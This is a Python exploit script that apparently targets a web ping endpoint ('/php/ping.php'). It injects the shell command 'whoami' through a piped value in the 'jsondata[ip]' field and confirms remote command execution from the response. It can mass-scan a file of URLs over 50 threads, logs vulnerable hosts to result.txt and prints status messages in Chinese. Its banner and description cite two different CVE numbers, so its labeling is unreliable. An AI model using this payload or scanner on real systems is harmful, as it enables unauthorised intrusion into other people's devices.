import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """   _______      ________    ___   ___ ___  ____          __   ___   ___  _____ 
  / ____\ \    / /  ____|  |__ \ / _ \__ \|___ \        / /  / _ \ / _ \| ____|
 | |     \ \  / /| |__ ______ ) | | | | ) | __) |_____ / /_ | (_) | (_) | |__  
 | |      \ \/ / |  __|______/ /| | | |/ / |__ <______| '_ \ > _ < \__, |___ \ 
 | |____   \  /  | |____    / /_| |_| / /_ ___) |     | (_) | (_) |  / / ___) |
  \_____|   \/   |______|  |____|\___/____|____/       \___/ \___/  /_/ |____/ 
                                                                               
                                                                               

"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="CVE-2023-43662")
    parser.add_argument('-u','-url',dest='url',type=str,help="Please input your URL")
    parser.add_argument('-f','-file',dest='file',type=str,help="Please input your File path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/php/ping.php"
    headers = {     
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close',
        'Content-Length': '38',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    data = "jsondata[ip]=a|whoami&jsondata[type]=1"
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)
        # print(res1.text)
        if res1.status_code == 200 and 'administrator' in res1.text:
            print(f"[+]{target}存在RCE漏洞")
            with open('result.txt','a')as f:
                f.write(target+'\n')
        else:
                print(f"[-]{target}不存在RCE漏洞")
    except Exception as e:
        print(f"Exception occurred: {e}")
if __name__ == "__main__":
    main()
